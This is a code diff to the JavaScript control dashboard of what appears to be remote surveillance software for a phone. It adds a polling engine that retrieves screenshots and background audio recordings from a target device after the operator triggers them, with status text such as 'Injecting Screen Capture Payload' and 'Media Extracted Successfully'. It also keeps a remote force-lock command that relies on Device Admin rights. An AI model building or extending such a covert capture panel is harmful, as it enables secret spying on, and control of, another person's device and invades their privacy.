@@ -103,7 +103,7 @@ class DashboardEngine {
 }
 
 // ==========================================
-// 🚀 SECURE REMOTE ACTIONS ENGINE (UPGRADED)
+// 🚀 SECURE REMOTE ACTIONS ENGINE
 // ==========================================
 
 window.executeRemoteAction = async function(actionType, extraParams = {}) {
@@ -125,7 +125,7 @@ window.executeRemoteAction = async function(actionType, extraParams = {}) {
         const result = await res.json();
         if (result.status !== 'success') {
             alert(`❌ Action Failed: ${result.message}`);
-            setLiveOpsStatus('idle'); // Reset on failure
+            setLiveOpsStatus('idle'); 
         }
     } catch (e) {
         console.error("Action Execution Error:", e);
@@ -134,7 +134,11 @@ window.executeRemoteAction = async function(actionType, extraParams = {}) {
     }
 };
 
-// --- LIVE OPS UI STATE MACHINE ---
+// ==========================================
+// 🚀 REAL-TIME POLLING ENGINE FOR LIVE OPS
+// ==========================================
+window.activePollId = null; 
+
 window.setLiveOpsStatus = (state, message = '', fileUrl = '#') => {
     const statusDiv = document.getElementById('live-ops-status');
     const btnScreen = document.getElementById('btn-screenshot');
@@ -146,44 +150,83 @@ window.setLiveOpsStatus = (state, message = '', fileUrl = '#') => {
         statusDiv.style.display = 'none';
         btnScreen.disabled = false;
         btnAudio.disabled = false;
+        if (window.activePollId) clearInterval(window.activePollId);
     } 
     else if (state === 'pending') {
         statusDiv.style.display = 'block';
         btnScreen.disabled = true;
         btnAudio.disabled = true;
-        statusDiv.innerHTML = `<span style="color: #f1c40f; font-weight: bold;">⏳ ${message} <br/><small style="color:#ccc; font-weight:normal;">Waiting for device to upload...</small></span>`;
-        
-        // 🔴 REALITY CHECK (Pro Note):
-        // Asli tracker tabhi kaam karega jab hum File Manager ka backend banayenge.
-        // Jab File Manager ban jayega, tab JS wahan check karegi. 
-        // Abhi ke liye, main ek 15-second ka mock lagaya hu taaki tu UI flow dekh sake ki kaisa lagega.
-        setTimeout(() => {
-            setLiveOpsStatus('ready', 'Media Uploaded to Storage!', '/files');
-        }, 15000); 
+        statusDiv.innerHTML = `<span style="color: #f1c40f; font-weight: bold;">⏳ ${message} <br/><small style="color:#ccc; font-weight:normal;">Polling backend for incoming file...</small></span>`;
     } 
     else if (state === 'ready') {
         btnScreen.disabled = false;
         btnAudio.disabled = false;
+        if (window.activePollId) clearInterval(window.activePollId);
         statusDiv.innerHTML = `
             <span style="color: #2ecc71; margin-bottom: 8px; display: block; font-weight: bold;">✅ ${message}</span>
-            <a href="${fileUrl}" style="background: #3498db; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; display: inline-block; font-weight: bold; font-size: 13px; text-transform: uppercase;">View / Play Media</a>
+            <a href="${fileUrl}" target="_blank" style="background: #3498db; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; display: inline-block; font-weight: bold; font-size: 13px; text-transform: uppercase;">View / Play Media</a>
         `;
     }
 };
 
+window.pollForMedia = async (actionTime, mediaType) => {
+    const deviceId = localStorage.getItem('active_device_id');
+    const token = localStorage.getItem('owner_token');
+    if (!deviceId || !token) return;
+
+    let attempts = 0;
+    const maxAttempts = 25; // 25 attempts * 3 sec = max 75 seconds wait time
+
+    if (window.activePollId) clearInterval(window.activePollId);
+
+    window.activePollId = setInterval(async () => {
+        attempts++;
+        if (attempts > maxAttempts) {
+            clearInterval(window.activePollId);
+            window.setLiveOpsStatus('idle');
+            alert("Timeout: The device hasn't uploaded the file yet. It might be offline or recording.");
+            return;
+        }
+
+        try {
+            const res = await fetch(`/api/files?device_id=${deviceId}&limit=5`, {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            const result = await res.json();
+            
+            if (result.status === 'success' && result.data && result.data.length > 0) {
+                // Check if the latest file matches our requested type and was uploaded AFTER the action was triggered
+                const latestFile = result.data[0];
+                const fileTime = new Date(latestFile.uploaded_at).getTime();
+                
+                if (fileTime > actionTime && latestFile.file_type.includes(mediaType)) {
+                    clearInterval(window.activePollId);
+                    window.setLiveOpsStatus('ready', 'Media Extracted Successfully!', latestFile.file_url);
+                }
+            }
+        } catch (e) {
+            console.error("Polling Network Error:", e);
+        }
+    }, 3000); 
+};
+
 window.requestScreenshot = () => {
-    setLiveOpsStatus('pending', 'Capturing Screen...');
-    window.executeRemoteAction('take_screenshot'); // Action name changed to screenshot
+    const actionTime = Date.now() - 5000; // Buffer time
+    setLiveOpsStatus('pending', 'Injecting Screen Capture Payload...');
+    window.executeRemoteAction('take_screenshot');
+    window.pollForMedia(actionTime, 'screenshot');
 };
 
 window.requestAudioSync = () => {
+    const actionTime = Date.now() - 5000; // Buffer time
     const duration = document.getElementById('audio-duration').value;
-    setLiveOpsStatus('pending', `Recording Audio (${duration} seconds)...`);
+    setLiveOpsStatus('pending', `Recording Audio Background (${duration}s)...`);
     window.executeRemoteAction('record_audio', { duration: parseInt(duration) });
+    window.pollForMedia(actionTime, 'audio');
 };
 
 window.forceLockDevice = () => {
-    alert("Lock Command Sent. Note: App must have Device Admin permission to execute this.");
+    alert("Lock Command Sent. Device Admin permissions will handle execution.");
     window.executeRemoteAction('force_lock');
 }
 
